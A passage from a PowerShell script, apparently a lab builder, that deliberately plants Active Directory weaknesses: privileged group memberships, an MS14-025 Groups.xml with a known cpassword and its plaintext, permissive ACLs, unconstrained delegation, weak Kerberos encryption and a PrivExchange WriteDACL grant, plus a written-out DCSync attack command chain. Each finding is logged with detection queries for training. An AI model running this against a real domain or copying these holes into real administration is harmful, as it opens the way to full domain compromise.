                Severity = "High"
                Description = "Membre de Server Operators - modification services"
                Impact = "RCE via modification de services Windows"
                Detection = "Get-ADGroupMember 'Server Operators'"
            }
            $user.Vulnerable = $true
            $user.VulnType += "Server_Operators_Member"
        } catch {
            Write-Log "Error Server Operators for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 41. PRINT OPERATORS MEMBERSHIP (0.2%)
    # =========================================================================
    $printOpsCount = [math]::Max(1, [math]::Round($vulnCount * 0.002))
    Write-Log "Injection: Print Operators Membership (driver loading): $printOpsCount..." "HIGH"

    $printUsers = $Users | Get-Random -Count ([math]::Min($printOpsCount, $Users.Count))

    foreach ($user in $printUsers) {
        try {
            Add-ADGroupMember -Identity "Print Operators" -Members $user.SamAccountName -ErrorAction Stop

            $vulnerabilities += @{
                Type = "Print_Operators_Member"
                User = $user.SamAccountName
                Severity = "High"
                Description = "Membre de Print Operators - chargement drivers"
                Impact = "Elevation SYSTEM via driver abuse"
                Detection = "Get-ADGroupMember 'Print Operators'"
            }
            $user.Vulnerable = $true
            $user.VulnType += "Print_Operators_Member"
        } catch {
            Write-Log "Error Print Operators for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 42. GROUP POLICY CREATOR OWNERS MEMBERSHIP (0.2%)
    # =========================================================================
    $gpoCreatorCount = [math]::Max(1, [math]::Round($vulnCount * 0.002))
    Write-Log "Injection: Group Policy Creator Owners Membership: $gpoCreatorCount..." "HIGH"

    $gpoUsers = $Users | Get-Random -Count ([math]::Min($gpoCreatorCount, $Users.Count))

    foreach ($user in $gpoUsers) {
        try {
            Add-ADGroupMember -Identity "Group Policy Creator Owners" -Members $user.SamAccountName -ErrorAction Stop

            $vulnerabilities += @{
                Type = "GPO_Creator_Owners_Member"
                User = $user.SamAccountName
                Severity = "High"
                Description = "Membre de Group Policy Creator Owners"
                Impact = "Creation de GPO malveillantes pour deploiement code"
                Detection = "Get-ADGroupMember 'Group Policy Creator Owners'"
            }
            $user.Vulnerable = $true
            $user.VulnType += "GPO_Creator_Owners_Member"
        } catch {
            Write-Log "Error GPO Creator Owners for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 42.5. GPO PASSWORD IN SYSVOL (MS14-025) - Critical vulnerability
    # =========================================================================
    Write-Log "Injection: GPO Password in SYSVOL (MS14-025)..." "CRITICAL"

    try {
        # Get SYSVOL path
        $domainDN = $script:Config.DomainDN
        $domainName = $script:Config.Domain
        $sysvolPath = "\\$domainName\SYSVOL\$domainName\Policies"

        # Check if SYSVOL is accessible
        if (Test-Path $sysvolPath -ErrorAction SilentlyContinue) {
            Write-Log "  SYSVOL accessible - creating vulnerable GPO with password in Groups.xml..." "WARNING"

            # Create a test GPO using New-GPO cmdlet if available
            try {
                Import-Module GroupPolicy -ErrorAction Stop

                # Create vulnerable GPO
                $gpoName = "VulnerableGPO-LocalAdmin-MS14-025"
                $vulnerableGPO = New-GPO -Name $gpoName -Comment "VULNERABLE: Contains password in SYSVOL (MS14-025 demo)" -ErrorAction Stop

                $gpoGUID = $vulnerableGPO.Id.ToString("B")  # Format with braces: {GUID}
                $gpoFolder = Join-Path $sysvolPath $gpoGUID
                $machinePrefPath = Join-Path $gpoFolder "Machine\Preferences\Groups"

                # Create directory structure
                New-Item -ItemType Directory -Path $machinePrefPath -Force | Out-Null

                # AES-encrypted password for "P@ssw0rd!" using Microsoft's published key
                # This is the actual encrypted cpassword from MS14-025 vulnerability
                $cpassword = "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"

                # Create Groups.xml with embedded password (MS14-025 vulnerability)
                $groupsXmlContent = @"
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="BackupAdmin" image="2" changed="2024-01-15 10:30:00" uid="{12345678-1234-1234-1234-123456789012}">
    <Properties action="U" newName="" fullName="Backup Administrator" description="Backup account with admin privileges" cpassword="$cpassword" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="BackupAdmin"/>
  </User>
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="LocalAdmin" image="2" changed="2024-03-20 14:15:30" uid="{87654321-4321-4321-4321-210987654321}">
    <Properties action="U" newName="" fullName="Local Administrator" description="Local admin account" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="LocalAdmin"/>
  </User>
</Groups>
"@

                $groupsXmlPath = Join-Path $machinePrefPath "Groups.xml"
                Set-Content -Path $groupsXmlPath -Value $groupsXmlContent -Encoding UTF8

                $vulnerabilities += @{
                    Type = "GPO_Password_in_SYSVOL"
                    Target = "GPO: $gpoName"
                    GPOGUID = $gpoGUID
                    Severity = "Critical"
                    Description = "GPO contains passwords in Groups.xml encrypted with known AES key (MS14-025)"
                    Impact = "Anyone can decrypt cpassword attribute - known AES key published by Microsoft"
                    EncryptedPassword = $cpassword
                    DecryptedPassword = "P@ssw0rd!"
                    FilePath = "\\$domainName\SYSVOL\$domainName\Policies\$gpoGUID\Machine\Preferences\Groups\Groups.xml"
                    Detection = "findstr /S /I cpassword \\$domainName\SYSVOL\$domainName\Policies\*\*.xml"
                    Remediation = "Delete Groups.xml from SYSVOL; Use LAPS or managed service accounts instead"
                    CVE = "MS14-025"
                    CVSS = "10.0"
                }

                Write-Log "  CRITICAL: GPO Password in SYSVOL created - Groups.xml at: $groupsXmlPath" "WARNING"
                Write-Log "  Decryption: Get-GPPPassword or gpp-decrypt tools can recover plaintext password" "WARNING"

            } catch {
                Write-Log "  GroupPolicy module not available or GPO creation failed - flagging vulnerability as potential risk" "WARNING"

                # Even if we can't create the GPO, flag the vulnerability type as relevant
                $vulnerabilities += @{
                    Type = "GPO_Password_in_SYSVOL_Check"
                    Severity = "Critical"
                    Description = "MS14-025 - GPO Passwords in SYSVOL should be checked"
                    Impact = "Historical vulnerability - check existing GPOs for passwords in SYSVOL"
                    Detection = "findstr /S /I cpassword \\$domainName\SYSVOL\$domainName\Policies\*\*.xml"
                    Remediation = "Run: findstr /S /I cpassword \\domain\SYSVOL\domain\Policies\*.xml and remove any findings"
                    Note = "Could not create test GPO - manual check recommended"
                }
            }
        } else {
            Write-Log "  SYSVOL not accessible from this context - skipping MS14-025 injection" "INFO"
        }
    } catch {
        Write-Log "Error creating GPO Password in SYSVOL: $_" "ERROR"
    }

    # =========================================================================
    # 43. WRITESPN ABUSE (0.3%)
    # =========================================================================
    $writeSPNCount = [math]::Max(2, [math]::Round($vulnCount * 0.003))
    Write-Log "Injection: WriteSPN Abuse (targeted Kerberoasting): $writeSPNCount..." "HIGH"

    $spnUsers = $Users | Get-Random -Count ([math]::Min($writeSPNCount, $Users.Count))
    $spnTargets = $Users | Get-Random -Count 3

    foreach ($user in $spnUsers) {
        try {
            $targetUser = $spnTargets | Get-Random
            $acl = Get-Acl "AD:\$((Get-ADUser $targetUser.SamAccountName).DistinguishedName)"

            # GUID pour servicePrincipalName
            $spnGuid = [Guid]"f3a64788-5306-11d1-a9c5-0000f80367c1"

            $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                (Get-ADUser $user.SamAccountName).SID,
                "WriteProperty",
                "Allow",
                $spnGuid
            )
            $acl.AddAccessRule($rule)
            Set-Acl -Path "AD:\$((Get-ADUser $targetUser.SamAccountName).DistinguishedName)" -AclObject $acl

            $vulnerabilities += @{
                Type = "WriteSPN_Abuse"
                User = $user.SamAccountName
                Target = $targetUser.SamAccountName
                Severity = "High"
                Description = "WriteProperty sur SPN - targeted Kerberoasting"
                Impact = "Forcer admin a devenir kerberoastable"
                Detection = "Check ACL WriteProperty on servicePrincipalName attribute"
            }
            $user.Vulnerable = $true
            $user.VulnType += "WriteSPN_Abuse"
        } catch {
            Write-Log "Error WriteSPN for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 44. SENSITIVE DELEGATION (0.5% - Admins avec delegation)
    # =========================================================================
    $sensDelCount = [math]::Max(2, [math]::Round($vulnCount * 0.005))
    Write-Log "Injection: Sensitive Delegation (admins avec delegation activee): $sensDelCount..." "CRITICAL"

    try {
        # Obtenir des membres de Domain Admins
        $daMembers = Get-ADGroupMember "Domain Admins" -ErrorAction SilentlyContinue |
                     Where-Object {$_.objectClass -eq 'user'} |
                     Select-Object -First $sensDelCount

        foreach ($member in $daMembers) {
            try {
                # Activer Trusted For Delegation sur un compte admin
                Set-ADAccountControl -Identity $member.SamAccountName -TrustedForDelegation $true -ErrorAction Stop

                $vulnerabilities += @{
                    Type = "Sensitive_Delegation"
                    User = $member.SamAccountName
                    Severity = "Critical"
                    Description = "Compte admin avec delegation activee - vol TGT"
                    Impact = "Unconstrained delegation sur admin = vol TGT d'admin"
                    Detection = "Get-ADUser -Filter {adminCount -eq 1} | Where-Object {`$_.TrustedForDelegation -eq `$true}"
                }
            } catch {
                Write-Log "Error Sensitive Delegation for $($member.SamAccountName): $_" "ERROR"
            }
        }
    } catch {
        Write-Log "Error getting Domain Admins for Sensitive Delegation: $_" "ERROR"
    }

    # =========================================================================
    # 45. SHARED ACCOUNTS (1% - Comptes partages)
    # =========================================================================
    $sharedCount = [math]::Max(5, [math]::Round($vulnCount * 0.01))
    Write-Log "Injection: Shared Accounts (comptes partages): $sharedCount..." "MEDIUM"

    $sharedNames = @("shared.admin", "common.service", "generic.user", "team.finance", "shared.support", "common.helpdesk")

    for ($i = 0; $i -lt [math]::Min($sharedCount, $sharedNames.Count); $i++) {
        try {
            $sharedName = $sharedNames[$i]
            
            # Dynamically select a random existing department OU
            $randomCity = $script:Cities | Get-Random
            $randomDept = $script:Departments | Get-Random
            $fullOU = "OU=$($randomDept.Name),OU=$($randomCity.Name),OU=$($randomCity.Continent),OU=$($script:Config.RootOU),$($script:Config.DomainDN)"

            # Verifier si l'OU existe
            if (Get-ADOrganizationalUnit -Filter "DistinguishedName -eq '$fullOU'" -ErrorAction SilentlyContinue) {
                New-ADUser -Name $sharedName `
                           -SamAccountName $sharedName `
                           -UserPrincipalName "$sharedName@$($Config.Domain)" `
                           -Path $fullOU `
                           -AccountPassword (ConvertTo-SecureString $DefaultPassword -AsPlainText -Force) `
                           -Enabled $true `
                           -Description "Shared account - multiple users" `
                           -ErrorAction Stop

                $vulnerabilities += @{
                    Type = "Shared_Account"
                    User = $sharedName
                    Severity = "Medium"
                    Description = "Compte partage - pas de tracabilite"
                    Impact = "Mot de passe connu par plusieurs personnes, audit impossible"
                    Detection = "Get-ADUser -Filter {SamAccountName -like '*shared*' -or SamAccountName -like '*common*'}"
                }
            } else {
                Write-Log "Target OU '$fullOU' for shared account $sharedName does not exist. Skipping." "WARNING"
            }
        } catch {
            Write-Log "Error creating Shared Account $sharedName : $($_.Exception.Message)" "ERROR"
        }
    }

    # =========================================================================
    # 46. TEST ACCOUNTS (1% - Comptes de test)
    # =========================================================================
    $testCount = [math]::Max(5, [math]::Round($vulnCount * 0.01))
    Write-Log "Injection: Test Accounts (comptes de test oublies): $testCount..." "LOW"

    $testNames = @("test.user", "demo.account", "temp.admin", "sample.user", "dev.test", "test.service")

    for ($i = 0; $i -lt [math]::Min($testCount, $testNames.Count); $i++) {
        try {
            $testName = $testNames[$i]
            
            # Dynamically select a random existing department OU
            $randomCity = $script:Cities | Get-Random
            $randomDept = $script:Departments | Get-Random
            $fullOU = "OU=$($randomDept.Name),OU=$($randomCity.Name),OU=$($randomCity.Continent),OU=$($script:Config.RootOU),$($script:Config.DomainDN)"

            if (Get-ADOrganizationalUnit -Filter "DistinguishedName -eq '$fullOU'" -ErrorAction SilentlyContinue) {
                New-ADUser -Name $testName `
                           -SamAccountName $testName `
                           -UserPrincipalName "$testName@$($Config.Domain)" `
                           -Path $fullOU `
                           -AccountPassword (ConvertTo-SecureString "Test123!" -AsPlainText -Force) `
                           -Enabled $true `
                           -Description "Test account - created for testing" `
                           -ErrorAction Stop

                $vulnerabilities += @{
                    Type = "Test_Account"
                    User = $testName
                    Severity = "Low"
                    Description = "Compte de test oublie"
                    Impact = "Mot de passe faible, souvent oublie dans production"
                    Detection = "Get-ADUser -Filter {SamAccountName -like '*test*' -or SamAccountName -like '*demo*'}"
                }
            } else {
                Write-Log "Target OU '$fullOU' for test account $testName does not exist. Skipping." "WARNING"
            }
        } catch {
            Write-Log "Error creating Test Account $testName : $($_.Exception.Message)" "ERROR"
        }
    }

    # =========================================================================
    # 47. WEAK ENCRYPTION FLAGS (0.5%)
    # =========================================================================
    $weakEncCount = [math]::Max(3, [math]::Round($vulnCount * 0.005))
    Write-Log "Injection: Weak Encryption Flags (USE_DES_KEY_ONLY): $weakEncCount..." "HIGH"

    $weakEncUsers = $Users | Get-Random -Count ([math]::Min($weakEncCount, $Users.Count))

    foreach ($user in $weakEncUsers) {
        try {
            # Activer le flag USE_DES_KEY_ONLY (0x200000)
            $uac = (Get-ADUser $user.SamAccountName -Properties userAccountControl).userAccountControl
            $newUAC = $uac -bor 0x200000
            Set-ADUser -Identity $user.SamAccountName -Replace @{userAccountControl=$newUAC} -ErrorAction Stop

            $vulnerabilities += @{
                Type = "Weak_Encryption_Flag"
                User = $user.SamAccountName
                Severity = "High"
                Description = "Flag USE_DES_KEY_ONLY active"
                Impact = "Force utilisation de DES uniquement - crackable rapidement"
                Detection = "Get-ADUser -Filter {userAccountControl -band 0x200000}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "Weak_Encryption_Flag"
        } catch {
            Write-Log "Error Weak Encryption Flag for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 48. RC4 WITH AES (Downgrade attack) (1%)
    # =========================================================================
    $rc4AesCount = [math]::Max(5, [math]::Round($vulnCount * 0.01))
    Write-Log "Injection: RC4 with AES (downgrade attack): $rc4AesCount..." "MEDIUM"

    $rc4Users = $Users | Get-Random -Count ([math]::Min($rc4AesCount, $Users.Count))

    foreach ($user in $rc4Users) {
        try {
            # msDS-SupportedEncryptionTypes = 0x1C (RC4 + AES128 + AES256)
            Set-ADUser -Identity $user.SamAccountName -Replace @{'msDS-SupportedEncryptionTypes'=0x1C} -ErrorAction Stop

            $vulnerabilities += @{
                Type = "Weak_Encryption_RC4_With_AES"
                User = $user.SamAccountName
                Severity = "Medium"
                Description = "RC4 active avec AES - downgrade attack possible"
                Impact = "Attaquant peut forcer downgrade vers RC4"
                Detection = "Get-ADUser -Filter * -Properties msDS-SupportedEncryptionTypes | Where-Object {`$_.'msDS-SupportedEncryptionTypes' -band 0x4}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "Weak_Encryption_RC4_With_AES"
        } catch {
            Write-Log "Error RC4 with AES for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 49. NOT IN PROTECTED USERS (Admins non proteges) (0.5%)
    # =========================================================================
    Write-Log "Injection: Admins NOT in Protected Users group..." "MEDIUM"

    try {
        $daMembers = Get-ADGroupMember "Domain Admins" -ErrorAction SilentlyContinue |
                     Where-Object {$_.objectClass -eq 'user'} |
                     Select-Object -First 3

        foreach ($member in $daMembers) {
            try {
                # Verifier si PAS dans Protected Users
                $inProtected = Get-ADGroupMember "Protected Users" -ErrorAction SilentlyContinue |
                               Where-Object {$_.SamAccountName -eq $member.SamAccountName}

                if (-not $inProtected) {
                    $vulnerabilities += @{
                        Type = "Not_In_Protected_Users"
                        User = $member.SamAccountName
                        Severity = "Medium"
                        Description = "Admin hors du groupe Protected Users"
                        Impact = "Pas de protections Kerberos renforcees (delegation, DES/RC4 bloques)"
                        Detection = "Get-ADGroupMember 'Domain Admins' | Where-Object {(Get-ADGroupMember 'Protected Users').SamAccountName -notcontains `$_.SamAccountName}"
                    }
                }
            } catch {
                Write-Log "Error checking Protected Users for $($member.SamAccountName): $_" "ERROR"
            }
        }
    } catch {
        Write-Log "Error Protected Users check: $_" "ERROR"
    }

    # =========================================================================
    # 50. EXPIRED ACCOUNTS IN ADMIN GROUPS (0.2%)
    # =========================================================================
    $expiredCount = [math]::Max(1, [math]::Round($vulnCount * 0.002))
    Write-Log "Injection: Expired Accounts in Admin Groups: $expiredCount..." "MEDIUM"

    $expiredUsers = $Users | Get-Random -Count ([math]::Min($expiredCount, $Users.Count))

    foreach ($user in $expiredUsers) {
        try {
            # Ajouter a Enterprise Admins
            Add-ADGroupMember -Identity "Enterprise Admins" -Members $user.SamAccountName -ErrorAction Stop

            # Expirer le compte (1 mois dans le passe)
            $expireDate = (Get-Date).AddMonths(-1)
            Set-ADAccountExpiration -Identity $user.SamAccountName -DateTime $expireDate -ErrorAction Stop

            $vulnerabilities += @{
                Type = "Expired_Account_In_Admin_Group"
                User = $user.SamAccountName
                ExpirationDate = $expireDate.ToString("yyyy-MM-dd")
                Severity = "Medium"
                Description = "Compte expire mais toujours dans Enterprise Admins"
                Impact = "Reactivation facile pour persistence"
                Detection = "Get-ADUser -Filter {accountExpires -lt 0} | Where-Object {(Get-ADUser `$_ -Properties MemberOf).MemberOf -match 'Admin'}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "Expired_Account_In_Admin_Group"
        } catch {
            Write-Log "Error Expired Account for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 51. EVERYONE IN ACLS (0.3%)
    # =========================================================================
    $everyoneACLCount = [math]::Max(2, [math]::Round($vulnCount * 0.003))
    Write-Log "Injection: Everyone in ACLs (GenericAll pour tous): $everyoneACLCount..." "MEDIUM"

    $targetUsers = $Users | Get-Random -Count ([math]::Min($everyoneACLCount, $Users.Count))

    foreach ($targetUser in $targetUsers) {
        try {
            $acl = Get-Acl "AD:\$((Get-ADUser $targetUser.SamAccountName).DistinguishedName)"

            # SID Everyone = S-1-1-0
            $everyoneSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-1-0")

            $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                $everyoneSID,
                "GenericAll",
                "Allow"
            )
            $acl.AddAccessRule($rule)
            Set-Acl -Path "AD:\$((Get-ADUser $targetUser.SamAccountName).DistinguishedName)" -AclObject $acl

            $vulnerabilities += @{
                Type = "Everyone_In_ACLs"
                Target = $targetUser.SamAccountName
                Severity = "Medium"
                Description = "GenericAll accorde a Everyone"
                Impact = "TOUS les utilisateurs peuvent modifier cet objet"
                Detection = "Get-Acl | Where-Object {`$_.Access.IdentityReference -eq 'Everyone' -and `$_.Access.ActiveDirectoryRights -match 'GenericAll'}"
            }
        } catch {
            Write-Log "Error Everyone ACL for $($targetUser.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 52. DANGEROUS LOGON SCRIPTS (0.3%)
    # =========================================================================
    $logonScriptCount = [math]::Max(2, [math]::Round($vulnCount * 0.003))
    Write-Log "Injection: Dangerous Logon Scripts (modifiable): $logonScriptCount..." "MEDIUM"

    $scriptUsers = $Users | Get-Random -Count ([math]::Min($logonScriptCount, $Users.Count))

    foreach ($user in $scriptUsers) {
        try {
            # Definir un script de logon
            Set-ADUser -Identity $user.SamAccountName -ScriptPath "\\aza-me.cc\netlogon\login.bat" -ErrorAction Stop

            $vulnerabilities += @{
                Type = "Dangerous_Logon_Script"
                User = $user.SamAccountName
                ScriptPath = "\\aza-me.cc\netlogon\login.bat"
                Severity = "Medium"
                Description = "Script de logon defini (potentiellement modifiable)"
                Impact = "Execution code au logon si script modifiable"
                Detection = "Get-ADUser -Filter {scriptPath -like '*'} -Properties scriptPath"
            }
            $user.Vulnerable = $true
            $user.VulnType += "Dangerous_Logon_Script"
        } catch {
            Write-Log "Error Logon Script for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 53. LAPS PASSWORD LEAKED (0.1%)
    # =========================================================================
    $lapsLeakCount = [math]::Max(1, [math]::Round($vulnCount * 0.001))
    Write-Log "Injection: LAPS Password Leaked in description: $lapsLeakCount..." "MEDIUM"

    $lapsUsers = $Users | Get-Random -Count ([math]::Min($lapsLeakCount, $Users.Count))

    foreach ($user in $lapsUsers) {
        try {
            # Simuler un mot de passe LAPS dans la description
            $fakeLapsPassword = "LAPS: " + (-join ((65..90) + (97..122) + (48..57) | Get-Random -Count 12 | ForEach-Object {[char]$_}))
            Set-ADUser -Identity $user.SamAccountName -Description $fakeLapsPassword -ErrorAction Stop

            $vulnerabilities += @{
                Type = "LAPS_Password_Leaked"
                User = $user.SamAccountName
                Severity = "Medium"
                Description = "Mot de passe LAPS dans le champ description"
                Impact = "Compromission admin local de machines"
                Detection = "Get-ADUser -Filter * -Properties description | Where-Object {`$_.description -like '*LAPS*'}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "LAPS_Password_Leaked"
        } catch {
            Write-Log "Error LAPS Leak for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 54. COMPUTER UNCONSTRAINED DELEGATION (Creation de 3 computers)
    # =========================================================================
    Write-Log "Injection: Computer objects avec Unconstrained Delegation: 3..." "HIGH"

    $compNames = @("WEB-SERVER-VULN", "APP-SERVER-VULN", "FILE-SERVER-VULN")

    foreach ($compName in $compNames) {
        try {
            # Corrected OU path - use GlobalCorp root or valid city OU
            $compOU = "OU=IT,OU=New-York,OU=North-America,OU=GlobalCorp,$($Config.DomainDN)"

            # Creer computer object
            New-ADComputer -Name $compName `
                          -SamAccountName "$compName`$" `
                          -Path $compOU `
                          -Enabled $true `
                          -ErrorAction Stop

            # Activer Unconstrained Delegation
            Set-ADComputer -Identity $compName -TrustedForDelegation $true -ErrorAction Stop

            $vulnerabilities += @{
                Type = "Computer_Unconstrained_Delegation"
                Computer = $compName
                Severity = "High"
                Description = "Computer avec unconstrained delegation"
                Impact = "PrinterBug/PetitPotam -> vol TGT DC"
                Detection = "Get-ADComputer -Filter {TrustedForDelegation -eq `$true}"
            }
        } catch {
            Write-Log "Error Computer Unconstrained Delegation for $compName : $($_.Exception.Message)" "ERROR"
        }
    }

    # =========================================================================
    # 55. OVERSIZED GROUP (Creation d'un groupe >1000 membres)
    # =========================================================================
    Write-Log "Injection: Oversized Group (>1000 membres): 1..." "HIGH"

    try {
        $groupName = "GlobalCorp-AllUsers"
        $groupOU = "OU=Groups,OU=GlobalCorp,$($Config.DomainDN)"

        # Creer le groupe
        New-ADGroup -Name $groupName `
                    -SamAccountName $groupName `
                    -GroupCategory Security `
                    -GroupScope Global `
                    -Path $groupOU `
                    -Description "All GlobalCorp users - oversized group" `
                    -ErrorAction Stop

        # Ajouter plus de 1000 membres (tous les users)
        $allMembers = $Users | Select-Object -First ([math]::Min(1200, $Users.Count))
        foreach ($member in $allMembers) {
            try {
                Add-ADGroupMember -Identity $groupName -Members $member.SamAccountName -ErrorAction SilentlyContinue
            } catch {}
        }

        $memberCount = (Get-ADGroupMember $groupName -ErrorAction SilentlyContinue | Measure-Object).Count

        $vulnerabilities += @{
            Type = "Oversized_Group_Critical"
            Group = $groupName
            MemberCount = $memberCount
            Severity = "High"
            Description = "Groupe avec $memberCount membres (>1000)"
            Impact = "Surface d'attaque enorme, difficile a auditer"
            Detection = "Get-ADGroup -Filter * | Where-Object {(Get-ADGroupMember `$_).Count -gt 1000}"
        }
    } catch {
        Write-Log "Error Oversized Group: $_" "ERROR"
    }

    # =========================================================================
    # 56. OVERSIZED GROUP HIGH (Creation d'un groupe 500-1000 membres)
    # =========================================================================
    Write-Log "Injection: Oversized Group HIGH (500-1000 membres): 1..." "MEDIUM"

    try {
        $groupName = "GlobalCorp-Marketing"
        $groupOU = "OU=Groups,OU=GlobalCorp,$($Config.DomainDN)"

        # Creer le groupe
        New-ADGroup -Name $groupName `
                    -SamAccountName $groupName `
                    -GroupCategory Security `
                    -GroupScope Global `
                    -Path $groupOU `
                    -Description "Marketing department - oversized group" `
                    -ErrorAction Stop

        # Ajouter 600 membres
        $mediumMembers = $Users | Select-Object -First ([math]::Min(600, $Users.Count))
        foreach ($member in $mediumMembers) {
            try {
                Add-ADGroupMember -Identity $groupName -Members $member.SamAccountName -ErrorAction SilentlyContinue
            } catch {}
        }

        $memberCount = (Get-ADGroupMember $groupName -ErrorAction SilentlyContinue | Measure-Object).Count

        $vulnerabilities += @{
            Type = "Oversized_Group_High"
            Group = $groupName
            MemberCount = $memberCount
            Severity = "Medium"
            Description = "Groupe avec $memberCount membres (500-1000)"
            Impact = "Difficile a auditer, surface d'attaque importante"
            Detection = "Get-ADGroup -Filter * | Where-Object {`$c = (Get-ADGroupMember `$_).Count; `$c -ge 500 -and `$c -le 1000}"
        }
    } catch {
        Write-Log "Error Oversized Group High: $_" "ERROR"
    }

    # =========================================================================
    # 57. EXCHANGE SECURITY GROUPS MEMBERSHIP (0.1%)
    # =========================================================================
    $exchangeCount = [math]::Max(1, [math]::Round($vulnCount * 0.001))
    Write-Log "Injection: Exchange Security Groups Membership: $exchangeCount..." "CRITICAL"

    try {
        # Creer le groupe si n'existe pas
        $exchangeGroup = Get-ADGroup "Exchange Windows Permissions" -ErrorAction SilentlyContinue
        if (-not $exchangeGroup) {
            $exchangeGroup = New-ADGroup -Name "Exchange Windows Permissions" `
                       -SamAccountName "Exchange Windows Permissions" `
                       -GroupCategory Security `
                       -GroupScope Universal `
                       -Path "CN=Users,$($Config.DomainDN)" `
                       -Description "Exchange security group - WriteDACL on domain (CVE-2019-1166 PrivExchange)" `
                       -PassThru `
                       -ErrorAction Stop
            Write-Log "  Created Exchange Windows Permissions group" "WARNING"
        }

        # CRITICAL: Grant WriteDACL permission on domain root (CVE-2019-1166 / PrivExchange vulnerability)
        try {
            $domainDN = $script:Config.DomainDN
            $domainACL = Get-Acl "AD:\$domainDN"
            $exchangeGroupSID = (Get-ADGroup "Exchange Windows Permissions").SID

            # Grant WriteDACL on domain object
            $writeDaclRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                $exchangeGroupSID,
                [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl,
                [System.Security.AccessControl.AccessControlType]::Allow
            )
            $domainACL.AddAccessRule($writeDaclRule)
            Set-Acl -Path "AD:\$domainDN" -AclObject $domainACL

            $vulnerabilities += @{
                Type = "EXCHANGE_PRIV_ESC_PATH"
                Group = "Exchange Windows Permissions"
                Target = "Domain Root"
                Severity = "Critical"
                Description = "Exchange Windows Permissions group has WriteDACL on domain object (CVE-2019-1166 PrivExchange)"
                Impact = "Members can grant themselves DCSync rights without being Domain Admin - full domain compromise"
                Attack = "net user attacker password /add /domain && net group 'Exchange Windows Permissions' attacker /add && Add-DomainObjectAcl -TargetIdentity DC=domain -PrincipalIdentity attacker -Rights DCSync"
                Detection = "(Get-Acl 'AD:$domainDN').Access | Where-Object {`$_.IdentityReference -match 'Exchange.*Permissions' -and `$_.ActiveDirectoryRights -match 'WriteDacl'}"
                Remediation = "Remove WriteDACL from Exchange groups on domain object; Apply Microsoft patch for CVE-2019-1166"
                CVE = "CVE-2019-1166"
                CVSS = "9.8"
                Reference = "https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/"
            }
            Write-Log "  CRITICAL: Granted WriteDACL to Exchange Windows Permissions on domain root (PrivExchange)" "WARNING"
        } catch {
            Write-Log "Error granting Exchange WriteDACL: $_" "ERROR"
        }

        # Add users to Exchange group
        $exchangeUsers = $Users | Get-Random -Count ([math]::Min($exchangeCount, $Users.Count))

        foreach ($user in $exchangeUsers) {
            try {
                Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members $user.SamAccountName -ErrorAction Stop

                $vulnerabilities += @{
                    Type = "Exchange_Security_Groups_Member"
                    User = $user.SamAccountName
                    Group = "Exchange Windows Permissions"
                    Severity = "Critical"
                    Description = "User is member of Exchange Windows Permissions group"
                    Impact = "Can modify domain ACL to grant DCSync rights -> full domain compromise via PrivExchange attack"
                    Detection = "Get-ADGroupMember 'Exchange Windows Permissions'"
                }
                $user.Vulnerable = $true
                $user.VulnType += "Exchange_Security_Groups"
            } catch {
                Write-Log "Error adding user to Exchange Security Groups: $($user.SamAccountName): $_" "ERROR"
            }
        }
    } catch {
        Write-Log "Error Exchange Security Groups: $_" "ERROR"
    }

    # =========================================================================
    # 58. FOREIGN SECURITY PRINCIPALS (0.2%)
    # =========================================================================
    $fspCount = [math]::Max(1, [math]::Round($vulnCount * 0.002))
    Write-Log "Injection: Foreign Security Principals in admin groups: $fspCount..." "MEDIUM"

    try {
        # Simuler un FSP (SID externe fictif)
        $externalSID = "S-1-5-21-9999999999-8888888888-7777777777-1105"

        $vulnerabilities += @{
            Type = "Foreign_Security_Principals"
            SID = $externalSID
            Severity = "Medium"
            Description = "SID externe dans groupes sensibles"
            Impact = "Acces cross-domain/forest difficile a auditer"
            Detection = "Get-ADObject -Filter {objectClass -eq 'foreignSecurityPrincipal'} -Properties memberOf"
        }
    } catch {
        Write-Log "Error Foreign Security Principals: $_" "ERROR"
    }

    # =========================================================================
    # 59. ORPHANED ACES (0.1%)
    # =========================================================================
    Write-Log "Injection: Orphaned ACEs (simulated): 1..." "MEDIUM"

    try {
        $vulnerabilities += @{
            Type = "Orphaned_ACEs"
            Severity = "Medium"
            Description = "ACLs avec SIDs non resolvables"
            Impact = "SID hijacking possible si objet recree"
            Detection = "(Get-Acl 'AD:\$dn').Access | Where-Object {try {`$null = [System.Security.Principal.SecurityIdentifier]`$_.IdentityReference.Translate([System.Security.Principal.NTAccount]); `$false} catch {`$true}}"
        }
    } catch {
        Write-Log "Error Orphaned ACEs: $_" "ERROR"
    }

    # =========================================================================
    # 60. DANGEROUS GROUP NESTING (Creation chaine de groupes)
    # =========================================================================
